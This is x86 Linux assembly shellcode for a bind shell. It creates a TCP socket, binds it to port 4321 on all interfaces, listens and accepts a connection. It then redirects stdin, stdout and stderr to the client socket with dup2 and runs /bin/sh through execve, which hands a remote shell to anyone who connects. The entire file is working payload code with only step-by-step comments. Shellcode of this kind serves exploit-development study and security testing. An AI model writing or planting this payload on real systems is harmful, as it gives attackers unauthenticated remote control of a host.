global _start

section .text

_start:
xor eax,eax    ;clear eax, ebx, edx
xor ebx,ebx    
xor edx,edx    

;server=socket(2,1,0)
push  eax      ; 3rd Arg = 0
push  byte 0x1 ; 2nd Arg = 1
push  byte 0x2 ; 1st Arg = 2
mov   ecx,esp  ; as we mention pointer to arguments
inc   bl       ; SYS_SOCKET 1
xor eax, eax
mov   al,102    ; call socketcall 
int   0x80      
mov   esi,eax   ; store the return value (eax) into esi (server)

;bind(server,(struct sockaddr *)&serv_addr,0x10)
push  edx              ; zero
push long 0xE1100002
mov   ecx,esp          ; move addr struct (on stack) to ecx
push  byte  0x10       ; 3rd Arg = 0x10
push  ecx              ; save address of struct back on stack
push  esi               ; save server from previous
mov   ecx,esp          ; pointer to arguments
inc   bl               ; SYS_BIND 2
mov   al,102           
int   0x80             

;listen(server, 0)
xor eax, eax
push  edx              ; zero
push  esi              ; save server from previous
mov   ecx,esp          ; pointer to arguments
mov   bl,0x4           ; move 4 into bl, first arg of socketcall
mov   al,102           ; SYS_LISTEN 4
int   0x80             

;client=accept(server, 0, 0)
push  edx         ; 1st Arg = 0 
push  edx         ; 2nd Arg = 0
push  esi         ; save server from previous
mov   ecx,esp     ; apointer to argumentsl
inc   bl          ; SYS_ACCEPT 5
mov   al,102      
int   0x80        

; prepare for dup2 commands, need client file handle saved in ebx
mov   ebx,eax          

;dup2(client, 0)
xor   ecx,ecx          
mov   al,63            
int   0x80             

;dup2(client, 1)
inc   ecx              
mov   al,63            
int   0x80             

;dup2(client, 2)
inc   ecx              
mov   al,63            
int   0x80

; standard execve("/bin/sh"...)
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
push   edx
mov    edx, esp
push   ebx
mov    ecx, esp
mov    al, 11
int    0x80

